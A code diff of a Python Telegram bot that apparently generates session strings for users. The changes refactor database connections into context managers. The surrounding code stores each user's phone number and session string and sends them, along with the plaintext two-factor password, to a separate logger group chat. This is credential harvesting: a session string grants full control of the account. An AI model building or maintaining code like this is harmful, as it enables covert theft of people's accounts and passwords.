@@ -26,19 +26,18 @@ def get_db_connection():
 
 # 🔹 Ensure session_logs table is created
 def create_session_table():
-    db_connection = get_db_connection()
-    cursor = db_connection.cursor()
-    cursor.execute('''
-    CREATE TABLE IF NOT EXISTS session_logs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        user_id INTEGER NOT NULL,
-        phone TEXT NOT NULL,
-        session_string TEXT NOT NULL,
-        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-    )
-    ''')
-    db_connection.commit()
-    db_connection.close()
+    with get_db_connection() as db_connection:
+        cursor = db_connection.cursor()
+        cursor.execute('''
+        CREATE TABLE IF NOT EXISTS session_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER NOT NULL,
+            phone TEXT NOT NULL,
+            session_string TEXT NOT NULL,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+        ''')
+        db_connection.commit()
 
 # ✅ /start Command
 @bot.on(events.NewMessage(pattern="/start"))
@@ -121,12 +120,11 @@ async def process_input(event):
 
             # Log the session string to the database with timeout
             create_session_table()  # Ensure table exists before inserting
-            db_connection = get_db_connection()
-            cursor = db_connection.cursor()
-            cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
-                           (user_id, phone_number, session_string))
-            db_connection.commit()
-            db_connection.close()
+            with get_db_connection() as db_connection:
+                cursor = db_connection.cursor()
+                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
+                               (user_id, phone_number, session_string))
+                db_connection.commit()
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
 
@@ -160,12 +158,11 @@ async def process_input(event):
 
             # Log the session string to the database with timeout
             create_session_table()  # Ensure table exists before inserting
-            db_connection = get_db_connection()
-            cursor = db_connection.cursor()
-            cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
-                           (user_id, user_sessions[user_id]["phone"], session_string))
-            db_connection.commit()
-            db_connection.close()
+            with get_db_connection() as db_connection:
+                cursor = db_connection.cursor()
+                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
+                               (user_id, user_sessions[user_id]["phone"], session_string))
+                db_connection.commit()
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")
 
